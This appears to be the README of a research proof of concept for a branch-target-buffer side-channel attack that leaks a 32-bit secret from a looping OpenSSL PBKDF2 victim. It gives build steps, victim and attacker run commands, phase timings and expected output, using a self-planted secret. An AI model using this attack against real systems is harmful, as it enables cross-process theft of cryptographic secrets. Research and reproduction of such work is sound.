# Running the end-to-end demonstration (BTB-steered variant)

This leaks a 32-bit secret out of an OpenSSL victim from a separate,
unprivileged process. The victim does not cooperate: it just loops calling
`PKCS5_PBKDF2_HMAC`.

**BTB variant.** This is the port of `../Side_Channel_Demonstration` that steers
the victim through the **BTB instead of the IBP**. The BTB is indexed by
`PC[23:0]` only, so there is **no PHR setup anywhere**: `SHIFT_PHR`/`SET_PHR` and
the entire `fake_crypto_*`/`fake_obj` replay chain are gone, and only `gadget_plt`
(→ `strlen@plt`) and `gadget` (→ `pkey_fake_import`) are pinned on their victim
counterparts. Everything else (stall, handoff, cache readback) is unchanged.

## Milestone A — quickest way to check it works (address known)

After setup (step 1 below), prove the PHR-free BTB leak end-to-end with the
secret's high bits granted, skipping discovery:

```
# terminal 1: start the victim looping on core N (pick an isolated core)
./run_p0_infinite.sh core_id=N secret_value=0x12345678
# terminal 2: run the attacker with the address region given
./find_target_addr.py --core_id N --secret_value 0x12345678 --addr 0x12340000
```

Success = it converges to `secret_value = 0x12345678` (via the linear search +
`num_align` sweep). That is the BTB E1 steer + E2 readback working with no PHR.
A wrong `--addr` should NOT converge. Full self-discovery (no `--addr`) is
Milestone B and needs the 32-bit Peek-a-Walk changes, not yet done.

## 1. Download Pre-requisites

```
./build_libcrypto.sh                                 # OpenSSL -> openssl-3.5.0/libcrypto.a
make -C Peek-a-Walk-Modified/pwsc_library            # Peek-a-Walk -> .../build/pwsc.a
```

`build_libcrypto.sh` downloads OpenSSL and compiles it. Use only clang 14, as our testing environment used clang 14 and all byte offsets in the attacker is based on this. In a future release, we will make this work with any compiler.

The `make` step builds `pwsc.a`, which the attacker links even on the `--addr`
path (the initial layout-check build is `get_higher_bits=1`). Without it the
attacker link fails with `cannot find .../build/pwsc.a`.

## 2. Check the setup (1 minute)

```
./find_target_addr.py --verify_only
```

Needs no MSR driver and no isolated core. It should end with:

```
[OK]  All 2 chain offsets match attacker.nasm
[OK]  Layout check passed: every fake function shadows its victim
[OK]  Setup verified.
```

If this fails, stop here — it is a build problem, not a result.

## 3. Run the attack

```
python3 ./find_target_addr.py --core_id <core_id> --secret_value <secret_value>
```

Follow it with `tail -f run.log`. `setsid nohup` means you can close the SSH
session without killing the run.

Use any 32-bit `--secret_value`. Set `--core_id` to one of your isolated cores.

## 4. What to expect

**Takes 9 to 10 hours.** Nearly all of it is the attacker sleeping 24 ms per
handoff to give the victim the core.

The run has three phases:

1. **Discovery** (~9 h) — finds the address the secret was written to. Nine to
   twelve profiles, each about an hour. You will see lines like
   `find_level0_line: best=Line 18 (sum=890, gap=801)`.
2. **Linear search** (~30 min) — finds the low bits.
3. **`num_align` sweep** (~15 min) — finds the byte offset.

The startup `[WARN]` banner overestimates the runtime by 3×; ignore it.

## 5. How to tell it worked

The run ends with:

```
============================================================
Final result
============================================================
.sec_malicious_target = 0x12345640
num_align             = 56
secret_value          = 0x12345678
============================================================
```

## Faster option

To see the secret come out in ~15 minutes instead of 10 hours, skip discovery
by supplying the address:

```
./find_target_addr.py --core_id 5 --secret_value 0x12345678 --addr 0x12340000
```

This runs phases 2 and 3 only. It demonstrates the leak but grants the attacker
the top 20 bits, which the full run earns for itself.
